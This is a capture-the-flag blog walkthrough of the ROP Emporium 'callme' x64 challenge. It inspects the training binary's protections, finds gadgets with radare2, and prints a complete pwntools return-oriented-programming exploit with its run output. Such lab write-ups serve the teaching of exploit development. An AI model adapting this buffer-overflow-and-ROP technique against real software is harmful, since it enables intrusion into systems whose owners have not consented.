---
layout: single
title:  "ROP Emporium - Callme (x64)"
date:   2020-10-11
excerpt: "callme was a simple challenge from the rop emporium that required the pwner to call multiple functions with arguments back-to-back from a shared object file. I will be skipping some basic steps such as finding the offset at which we take control over RIP and analyzing execution flow in the ROP chain. If you wish to see how to do that, you should check out my previous blog posts on Rop Emporium ret2win and split."
categories:
  - ctf
  - infosec
tags:
  - binary exploitation
  - exploit development
  - defeating non-executable stacks
  - rop chaining
---

## Summary

callme was a simple challenge from the rop emporium that required the pwner to call multiple functions with arguments back-to-back from a shared object file. I will be skipping some basic steps such as finding the offset at which we take control over RIP and analyzing execution flow in the ROP chain. If you wish to see how to do that, you should check out my previous blog posts on Rop Emporium ret2win and split.

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec callme
[*] '/home/kali/ctf/rop-emporium/callme/x64/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is **non-executable**, so we won't be able to redirect the program's execution to memory instructions located on the stack.
It is also notable that `RUNPATH` points to the current working directory. This is because this challenge also came with a `libcallme.so` shared object file that links to the executable upon runtime:

```
$ ldd callme
        linux-vdso.so.1 (0x00007fff50dfc000)
        libcallme.so => ./libcallme.so (0x00007f80f459e000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f80f43bf000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f80f47a2000)
```

## Capturiung The Flag

This challenge presented an encrypted flag. The goal is to exploit the binary and decrypt the flag reusing library calls from `libcallme.so`.

```
$ ls
callme  encrypted_flag.dat  key1.dat  key2.dat  libcallme.so
```

To save time reverse engineering the binary, the challenge [kindly states](https://ropemporium.com/challenge/callme.html) that the objective is to call the following code to get the flag:

```c
callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d);
callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d);
callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d);
```

At this point, we should look for these functions in `callme`:

```
$ r2 callme
[0x00400760]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

```
[0x00400760]> afl
0x00400760    1 42           entry0
0x004006a8    3 23           sym._init
0x004009b4    1 9            sym._fini
0x004007a0    4 42   -> 37   sym.deregister_tm_clones
0x004007d0    4 58   -> 55   sym.register_tm_clones
0x00400810    3 34   -> 29   entry.fini0
0x00400840    1 7            entry.init0
0x00400898    1 90           sym.pwnme
0x00400700    1 6            sym.imp.memset
0x004006d0    1 6            sym.imp.puts
0x004006e0    1 6            sym.imp.printf
0x00400710    1 6            sym.imp.read
0x004008f2    1 74           sym.usefulFunction
0x004006f0    1 6            sym.imp.callme_three
0x00400740    1 6            sym.imp.callme_two
0x00400720    1 6            sym.imp.callme_one
0x00400750    1 6            sym.imp.exit
0x004009b0    1 2            sym.__libc_csu_fini
0x00400940    4 101          sym.__libc_csu_init
0x00400790    1 2            sym._dl_relocate_static_pie
0x00400847    1 81           main
0x00400730    1 6            sym.imp.setvbuf
```

As seen above, `callme_one` is located at `0x00400720`, `callme_two` at `0x00400740`, and `callme_three` at `0x004006f0`.

Now that we have the PLT addresses of these function calls, we can search for some ROP gadgets so that we can set the RDI, RSI, and RDX registers.
We need to do this because on x64 CPU architectures, the first argument to calling a function goes in the RDI register, the second in RSI, and third in RDX.

```
[0x00400760]> /R pop rdi;
  0x0040093c                 5f  pop rdi
  0x0040093d                 5e  pop rsi
  0x0040093e                 5a  pop rdx
  0x0040093f                 c3  ret

  0x004009a3                 5f  pop rdi
  0x004009a4                 c3  ret
```

A really nice gadget is located at `0x0040093c`. Leveraging this gadget, we should be able to construct a ROP chain that invokes `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` that looks like the following:

```
pop rdi; pop rsi; pop rdx; ret; | 0xdeadbeefdeadbeef | 0xcafebabecafebabe | 0xd00df00dd00df00d | callme_one
```

As the stack unravels from this gadget, `0xdeadbeefdeadbeef` will pop into RDI, `0xcafebabecafebabe` into RSI, and `0xd00df00dd00df00d` into RDX.
Finally, code execution will resume at `callme_one`.

Leveraging this concept, when `callme_one` returns, we can resume execution into the next part of our ROP chain which will look like this:

```
... | pop rdi; pop rsi; pop rdx; ret; | 0xdeadbeefdeadbeef | 0xcafebabecafebabe | 0xd00df00dd00df00d | callme_two
```

The pattern above is similar to the first part of the ROP chain. Basically, we can repeat this pattern as many times as we like.

Our final exploit code will look like the following:

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './callme'
io = process(PROCESS)

# Gadgets
rop = ROP(io.elf)
pop_rdi_pop_rsi_pop_rdx_ret = p64(rop.search(move=0,regs=['rdi', 'rsi', 'rdx']).address)
callme_one = p64(io.elf.plt['callme_one'])
callme_two = p64(io.elf.plt['callme_two'])
callme_three = p64(io.elf.plt['callme_three'])
arg0 = p64(0xdeadbeefdeadbeef)
arg1 = p64(0xcafebabecafebabe)
arg2 = p64(0xd00df00dd00df00d)

# Invoke callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.raw(pop_rdi_pop_rsi_pop_rdx_ret)
rop.raw(arg0)
rop.raw(arg1)
rop.raw(arg2)
rop.raw(callme_one)

# Invoke callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.raw(pop_rdi_pop_rsi_pop_rdx_ret)
rop.raw(arg0)
rop.raw(arg1)
rop.raw(arg2)
rop.raw(callme_two)

# Invoke callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop.raw(pop_rdi_pop_rsi_pop_rdx_ret)
rop.raw(arg0)
rop.raw(arg1)
rop.raw(arg2)
rop.raw(callme_three)

# Dump the final ROP chain
info(rop.dump())

# Build the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop.chain()
])

# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
```

One thing to note is that after verifying the existence of all gadgete with `radare2`, we codified the exploit to leverage `pwntools` to search for those same gadgets and build the ROP chain.

Below is the output from the final exploit:

```
$ python3 exploit.py
[+] Starting local process './callme' argv=[b'./callme'] : pid 6377
[DEBUG] PLT 0x4006d0 puts
[DEBUG] PLT 0x4006e0 printf
[DEBUG] PLT 0x4006f0 callme_three
[DEBUG] PLT 0x400700 memset
[DEBUG] PLT 0x400710 read
[DEBUG] PLT 0x400720 callme_one
[DEBUG] PLT 0x400730 setvbuf
[DEBUG] PLT 0x400740 callme_two
[DEBUG] PLT 0x400750 exit
[*] '/home/kali/ctf/rop-emporium/callme/x64/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 17 cached gadgets for './callme'
[DEBUG] PLT 0x4006d0 puts
[DEBUG] PLT 0x4006e0 printf
[DEBUG] PLT 0x4006f0 callme_three
[DEBUG] PLT 0x400700 memset
[DEBUG] PLT 0x400710 read
[DEBUG] PLT 0x400720 callme_one
[DEBUG] PLT 0x400730 setvbuf
[DEBUG] PLT 0x400740 callme_two
[DEBUG] PLT 0x400750 exit
[DEBUG] PLT 0x4006d0 puts
[DEBUG] PLT 0x4006e0 printf
[DEBUG] PLT 0x4006f0 callme_three
[DEBUG] PLT 0x400700 memset
[DEBUG] PLT 0x400710 read
[DEBUG] PLT 0x400720 callme_one
[DEBUG] PLT 0x400730 setvbuf
[DEBUG] PLT 0x400740 callme_two
[DEBUG] PLT 0x400750 exit
[DEBUG] PLT 0x4006d0 puts
[DEBUG] PLT 0x4006e0 printf
[DEBUG] PLT 0x4006f0 callme_three
[DEBUG] PLT 0x400700 memset
[DEBUG] PLT 0x400710 read
[DEBUG] PLT 0x400720 callme_one
[DEBUG] PLT 0x400730 setvbuf
[DEBUG] PLT 0x400740 callme_two
[DEBUG] PLT 0x400750 exit
[*] 0x0000: b'<\t@\x00\x00\x00\x00\x00' b'<\t@\x00\x00\x00\x00\x00'
    0x0008: b'\xef\xbe\xad\xde\xef\xbe\xad\xde' b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
    0x0010: b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca' b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca'
    0x0018: b'\r\xf0\r\xd0\r\xf0\r\xd0' b'\r\xf0\r\xd0\r\xf0\r\xd0'
    0x0020: b' \x07@\x00\x00\x00\x00\x00' b' \x07@\x00\x00\x00\x00\x00'
    0x0028: b'<\t@\x00\x00\x00\x00\x00' b'<\t@\x00\x00\x00\x00\x00'
    0x0030: b'\xef\xbe\xad\xde\xef\xbe\xad\xde' b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
    0x0038: b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca' b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca'
    0x0040: b'\r\xf0\r\xd0\r\xf0\r\xd0' b'\r\xf0\r\xd0\r\xf0\r\xd0'
    0x0048: b'@\x07@\x00\x00\x00\x00\x00' b'@\x07@\x00\x00\x00\x00\x00'
    0x0050: b'<\t@\x00\x00\x00\x00\x00' b'<\t@\x00\x00\x00\x00\x00'
    0x0058: b'\xef\xbe\xad\xde\xef\xbe\xad\xde' b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
    0x0060: b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca' b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca'
    0x0068: b'\r\xf0\r\xd0\r\xf0\r\xd0' b'\r\xf0\r\xd0\r\xf0\r\xd0'
    0x0070: b'\xf0\x06@\x00\x00\x00\x00\x00' b'\xf0\x06@\x00\x00\x00\x00\x00'
[DEBUG] Received 0x44 bytes:
    b'callme by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Hope you read the instructions...\n'
    b'\n'
    b'> '
[DEBUG] Sent 0xa1 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  3c 09 40 00  00 00 00 00  │AAAA│AAAA│<·@·│····│
    00000030  ef be ad de  ef be ad de  be ba fe ca  be ba fe ca  │····│····│····│····│
    00000040  0d f0 0d d0  0d f0 0d d0  20 07 40 00  00 00 00 00  │····│····│ ·@·│····│
    00000050  3c 09 40 00  00 00 00 00  ef be ad de  ef be ad de  │<·@·│····│····│····│
    00000060  be ba fe ca  be ba fe ca  0d f0 0d d0  0d f0 0d d0  │····│····│····│····│
    00000070  40 07 40 00  00 00 00 00  3c 09 40 00  00 00 00 00  │@·@·│····│<·@·│····│
    00000080  ef be ad de  ef be ad de  be ba fe ca  be ba fe ca  │····│····│····│····│
    00000090  0d f0 0d d0  0d f0 0d d0  f0 06 40 00  00 00 00 00  │····│····│··@·│····│
    000000a0  0a                                                  │·│
    000000a1
[*] Switching to interactive mode
[*] Process './callme' stopped with exit code 0 (pid 6377)
[DEBUG] Received 0x68 bytes:
    b'Thank you!\n'
    b'callme_one() called correctly\n'
    b'callme_two() called correctly\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

And it looks like we successfully decrypted the flag `ROPE{a_placeholder_32byte_flag!}`!
